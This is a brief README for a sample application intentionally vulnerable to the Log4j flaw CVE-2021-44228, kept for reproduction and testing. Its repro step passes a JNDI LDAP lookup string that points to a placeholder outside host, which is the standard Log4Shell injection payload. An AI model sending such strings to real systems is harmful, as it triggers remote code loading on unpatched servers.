# sample-vulnerable-log4j-direct-app

This repository is a sample repository that is vulnerable to [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

## Repro of vulnerability

``` shell
gradle run --args='${jndi:ldap://some.host.example.com/}'
```